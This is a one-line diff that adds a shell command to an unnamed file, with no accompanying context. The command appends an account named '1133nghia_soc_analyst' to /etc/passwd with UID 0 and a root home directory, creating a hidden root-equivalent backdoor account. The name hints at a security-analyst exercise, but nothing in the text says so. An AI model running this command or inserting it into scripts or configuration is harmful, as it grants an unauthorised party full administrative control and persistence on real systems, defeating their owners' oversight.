@@ -1,0 +1,1 @@
+sudo echo "1133nghia_soc_analyst:x:0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
